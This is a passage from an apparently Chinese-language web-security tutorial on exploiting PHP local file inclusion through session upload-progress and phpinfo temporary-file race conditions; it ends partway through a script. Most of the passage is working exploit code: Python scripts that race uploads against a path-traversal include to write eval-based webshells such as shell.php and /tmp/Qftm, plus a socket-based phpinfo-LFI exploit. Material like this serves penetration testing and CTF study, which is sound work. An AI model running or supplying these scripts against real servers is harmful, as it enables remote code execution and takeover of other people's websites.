文件就可以达到攻击效果。</p><p>但是现实是残酷的，事实上这并不能完全的利用成功，因为 PHP 的 <code>session.upload_progress.cleanup = on</code> 这个默认选项会有限制。即文件上传结束后，PHP 将会立即清空对应 Session 文件中的内容，这就导致我们在包含该 Session 的时候相当于在包含了一个空文件，没有包含我们传入的恶意代码。所以我们需要条件竞争，赶在文件被清除前利用包含即可。</p><p>还有一个点就是，如果此时不规定目标服务器上生成的 Session 文件的名字，就会生成一大堆不一样的 Session 文件，由于该 Session 文件过马上就会被清除，所以根本不是知道到底要用哪一个 Session 文件</p><p>所以这里还要对生成的 Session 文件进行重命名，规定其生成指定的名字，当然这也是可行的，就是在 cookie 里面修改 PHPSESSID 的值。假设我们修改 PHPSESSID 为 whoami，则生成统一的 Session 文件 ——&quot;sess_whoami&quot;</p><blockquote><p>默认情况下，session.use_strict_mode 值是 0，此时用户是可以自己定义 Session ID 的。比如，我们在 Cookie 里设置 PHPSESSID=whoami，PHP 将会在服务器上创建一个 session 文件：/var/lib/php/sessions/sess_whoami。</p></blockquote><p>使用 Python 实现创建 Session 文件的过程：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> io</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> threading</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>sessid <span class="token operator">=</span> <span class="token string">'whoami'</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token string">'http://192.168.43.82/index.php'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php phpinfo();fputs(fopen('/var/www/html/shell.php','w'),'&lt;?php @eval($_POST[whoami])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        POST<span class="token punctuation">(</span>session<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 成功写入sess_whoami"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>然后接下来就是抓包进行条件竞争了。</p><p>当然，也可以利用以下代码：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> io</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> threading</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>sessid <span class="token operator">=</span> <span class="token string">'whoami'</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token string">'http://192.168.43.82/index.php'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php phpinfo();fputs(fopen('/var/www/html/shell.php','w'),'&lt;?php @eval($_POST[whoami])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://192.168.43.82/index.php?file=../../../../../../../../var/lib/php/sessions/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token comment"># print('[+++]retry')</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token comment"># print(response.text)</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="临时文件包含"><a class="anchor" href="#临时文件包含">#</a> 临时文件包含</h3><p>在这之前，可以先了解一下 php 临时文件的机制。</p><h4 id="全局变量"><a class="anchor" href="#全局变量">#</a> 全局变量</h4><p>在 PHP 中可以使用 POST 方法或者 PUT 方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量 $_FILES 里。</p><p>$_FILES 超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过 PHP 脚本上传到服务器的文件至关重要。</p><figure class="highlight scss"><figcaption data-lang="Sass (Scss)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$_FILES</span>[<span class="token string">'userfile'</span>][<span class="token string">'name'</span>] 客户端文件的原名称。</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$_FILES</span>[<span class="token string">'userfile'</span>][<span class="token string">'type'</span>] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如<span class="token string">"image/gif"</span>。</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$_FILES</span>[<span class="token string">'userfile'</span>][<span class="token string">'size'</span>] 已上传文件的大小，单位为字节。</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$_FILES</span>[<span class="token string">'userfile'</span>][<span class="token string">'tmp_name'</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$_FILES</span>[<span class="token string">'userfile'</span>][<span class="token string">'error'</span>] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。</pre></td></tr></table></figure><p>在临时文件包含漏洞中 <code>$_FILES['userfile']['name']</code> 这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p><h4 id="存储目录"><a class="anchor" href="#存储目录">#</a> 存储目录</h4><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由 php.ini 的 <code>upload_tmp_dir</code> 属性指定，假如 <code>upload_tmp_dir</code> 的路径不可写，PHP 会上传到系统默认的临时目录中。</p><p>不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。</p><p>Linux 目录</p><p>Linxu 系统服务的临时文件主要存储在根目录的 tmp 文件夹下，具有一定的开放权限。</p><figure class="highlight scss"><figcaption data-lang="Sass (Scss)"></figcaption><table><tr><td data-num="1"></td><td><pre>/tmp/</pre></td></tr></table></figure><p>windows 目录</p><p>Windows 系统服务的临时文件主要存储在系统盘 Windows 文件夹下，具有一定的开放权限。</p><figure class="highlight scss"><figcaption data-lang="Sass (Scss)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token property">C</span><span class="token punctuation">:</span>/Windows/</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token property">C</span><span class="token punctuation">:</span>/Windows/Temp/</pre></td></tr></table></figure><h4 id="命名规则"><a class="anchor" href="#命名规则">#</a> 命名规则</h4><p>存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</p><p>可以通过 phpinfo 来查看临时文件的信息。</p><p>Linux Temporary File</p><p>Linux 临时文件主要存储在 <code>/tmp/</code> 目录下，格式通常是（ <code>/tmp/php[6个随机字符]</code> ）</p><p>Windows Temporary File</p><p>Windows 临时文件主要存储在 <code>C:/Windows/</code> 目录下，格式通常是（ <code>C:/Windows/php[4个随机字符].tmp</code> ）</p><p>PHPINFO 特性</p><p>通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，如果目标网站上存在 phpinfo，则可以通过 phpinfo 来获取临时文件名，进而进行包含。</p><p>当我们在给 PHP 发送 POST 数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP 都会将这个文件保存成一个临时文件。文件名可以在 <code>$_FILES</code> 变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>利用 phpinfo 的特性可以很好的帮助我们，因为 phpinfo 页面会将当前请求上下文中所有变量（所有数据）都打印出来，所以我们如果向 phpinfo 页面发送包含文件区块的数据包，则即可在返回包里找到 <code>$_FILES</code> 变量的内容，拿到 临时文件变量名 之后，就可以进行包含执行我们传入的恶意代码。</p><h4 id="利用原理"><a class="anchor" href="#利用原理">#</a> 利用原理</h4><p>验证了 phpinfo 的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可 Getshell。</p><p>但文件包含漏洞和 phpinfo 页面通常是两个页面，理论上我们需要先发送数据包给 phpinfo 页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行 getshell。但是在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p>利用过程</p><p>这个时候就需要用到条件竞争，具体原理和过程如下：</p><p>（1）发送包含了 webshell 的上传数据包给 phpinfo 页面，这个数据包的 header、get 等位置需要塞满垃圾数据</p><p>（2）因为 phpinfo 页面会将所有数据都打印出来，1 中的垃圾数据会将整个 phpinfo 页面撑得非常大</p><p>（3）php 默认的输出缓冲区大小为 4096，可以理解为 php 每次返回 4096 个字节给 socket 连接</p><p>（4）所以，我们直接操作原生 socket，每次读取 4096 个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p><p>（5）此时，第一个数据包的 socket 连接实际上还没结束，因为 php 还在继续每次输出 4096 个字节，所以临时文件此时还没有删除</p><p>（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终 getshell</p><p>（参考 ph 牛：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvcGhwL2luY2x1c2lvbiVFRiVCQyU4OQ==">https://github.com/vulhub/vulhub/tree/master/php/inclusion</span> ）</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#python version 2.7</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> threading</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> socket</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    TAG <span class="token operator">=</span> <span class="token string">"Security Test"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    PAYLOAD <span class="token operator">=</span> <span class="token triple-quoted-string string">"""%sr</span></pre></td></tr><tr><td data-num="11"></td><td><pre>&lt;?php file_put_contents('/tmp/Qftm', '&lt;?php eval($_REQUEST[Qftm])?>')?>r""" <span class="token operator">%</span> TAG</pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment"># PAYLOAD = """%sr</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment"># &lt;?php file_put_contents('/var/www/html/Qftm.php', '&lt;?php eval($_REQUEST[Qftm])?>')?>r""" % TAG</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    REQ1_DATA <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714r</span></pre></td></tr><tr><td data-num="15"></td><td><pre>Content-Disposition: form-data; name="dummyname"; filename="test.txt"r</pre></td></tr><tr><td data-num="16"></td><td><pre>Content-Type: text/plainr</pre></td></tr><tr><td data-num="17"></td><td><pre>r</pre></td></tr><tr><td data-num="18"></td><td><pre>%s</pre></td></tr><tr><td data-num="19"></td><td><pre>-----------------------------7dbff1ded0714--r""" <span class="token operator">%</span> PAYLOAD</pre></td></tr><tr><td data-num="20"></td><td><pre>    padding <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">5000</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    REQ1 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""POST /phpinfo.php?a="""</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">""" HTTP/1.1r</span></pre></td></tr><tr><td data-num="22"></td><td><pre>Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""r</span></pre></td></tr><tr><td data-num="23"></td><td><pre>HTTP_ACCEPT: """ <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""r</span></pre></td></tr><tr><td data-num="24"></td><td><pre>HTTP_USER_AGENT: """ <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""r</span></pre></td></tr><tr><td data-num="25"></td><td><pre>HTTP_ACCEPT_LANGUAGE: """ <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""r</span></pre></td></tr><tr><td data-num="26"></td><td><pre>HTTP_PRAGMA: """ <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""r</span></pre></td></tr><tr><td data-num="27"></td><td><pre>Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r</pre></td></tr><tr><td data-num="28"></td><td><pre>Content-Length: %sr</pre></td></tr><tr><td data-num="29"></td><td><pre>Host: %sr</pre></td></tr><tr><td data-num="30"></td><td><pre>r</pre></td></tr><tr><td data-num="31"></td><td><pre>%s""" <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> REQ1_DATA<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token comment"># modify this to suit the LFI script</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    LFIREQ <span class="token operator">=</span> <span class="token triple-quoted-string string">"""GET /index.php?file=%s HTTP/1.1r</span></pre></td></tr><tr><td data-num="34"></td><td><pre>User-Agent: Mozilla/4.0r</pre></td></tr><tr><td data-num="35"></td><td><pre>Proxy-Connection: Keep-Aliver</pre></td></tr><tr><td data-num="36"></td><td><pre>Host: %sr</pre></td></tr><tr><td data-num="37"></td><td><pre>r</pre></td></tr><tr><td data-num="38"></td><td><pre>r</pre></td></tr><tr><td data-num="39"></td><td><pre>"""</pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    d <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">17</span><span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">31</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">None</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre>    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        <span class="token keyword">return</span> fn</pre></td></tr><tr><td data-num="66"></td><td><pre></pre></td></tr><tr><td data-num="67"></td><td><pre>counter <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="71"></td><td><pre>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e</pre></td></tr><tr><td data-num="73"></td><td><pre>        self<span class="token punctuation">.</span>lock <span class="token operator">=</span> l</pre></td></tr><tr><td data-num="74"></td><td><pre>        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m</pre></td></tr><tr><td data-num="75"></td><td><pre>        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args</pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token keyword">global</span> counter</pre></td></tr><tr><td data-num="79"></td><td><pre>        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="80"></td><td><pre>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="81"></td><td><pre>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="82"></td><td><pre>                    <span class="token keyword">return</span></pre></td></tr><tr><td data-num="83"></td><td><pre>                counter <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="84"></td><td><pre></pre></td></tr><tr><td data-num="85"></td><td><pre>            <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="86"></td><td><pre>                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="88"></td><td><pre>                    <span class="token keyword">break</span></pre></td></tr><tr><td data-num="89"></td><td><pre>                <span class="token keyword">if</span> x<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="90"></td><td><pre>                    <span class="token keyword">print</span> <span class="token string">"nGot it! Shell created in /tmp/Qftm.php"</span></pre></td></tr><tr><td data-num="91"></td><td><pre>                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre></pre></td></tr><tr><td data-num="93"></td><td><pre>            <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="94"></td><td><pre>                <span class="token keyword">return</span></pre></td></tr><tr><td data-num="95"></td><td><pre></pre></td></tr><tr><td data-num="96"></td><td><pre><span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="97"></td><td><pre>    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="99"></td><td><pre>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="100"></td><td><pre>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="101"></td><td><pre></pre></td></tr><tr><td data-num="102"></td><td><pre>    d <span class="token operator">=</span> <span class="token 